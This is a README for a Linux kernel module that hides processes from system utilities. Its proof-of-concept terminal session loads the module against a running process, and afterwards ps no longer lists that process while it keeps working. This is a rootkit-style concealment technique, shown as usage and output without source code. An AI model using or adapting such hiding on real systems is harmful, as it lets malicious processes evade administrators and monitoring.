# hideproc-lkm
Linux 4.9 Loadable Kernel Module to hide processes from system utilities

### Proof of Concept

```
root @ debtest ~/hideproc-lkm # ./putfile&
[1] 1942

root @ debtest ~/hideproc-lkm # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:24 /tmp/test-put

root @ debtest ~/hideproc-lkm # rm /tmp/test-put

root @ debtest ~/hideproc-lkm # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:24 /tmp/test-put

root @ debtest ~/hideproc-lkm # ps aux | grep putfile
root      1942  0.0  0.0   4172   640 pts/0    SN   22:24   0:00 ./putfile
root      1949  0.0  0.0  12784   964 pts/0    S+   22:25   0:00 grep --color=auto putfile

root @ debtest ~/hideproc-lkm # dmesg -C

root @ debtest ~/hideproc-lkm # insmod hideproc.ko verb=1 target_pid=1942

root @ debtest ~/hideproc-lkm # rmmod hideproc

root @ debtest ~/hideproc-lkm # dmesg -c
[  510.232550] Target PID is 1942
[  510.232561] Process id is 1942
[  510.232561] Next process is insmod
[  510.232562] Prev process is kworker/1:0
[  516.951242] Goodbye, World!

root @ debtest ~/hideproc-lkm # ps aux | grep putfile

root @ debtest ~/hideproc-lkm [1] # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:26 /tmp/test-put

root @ debtest ~/hideproc-lkm # rm /tmp/test-put

root @ debtest ~/hideproc-lkm # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:26 /tmp/test-put
```
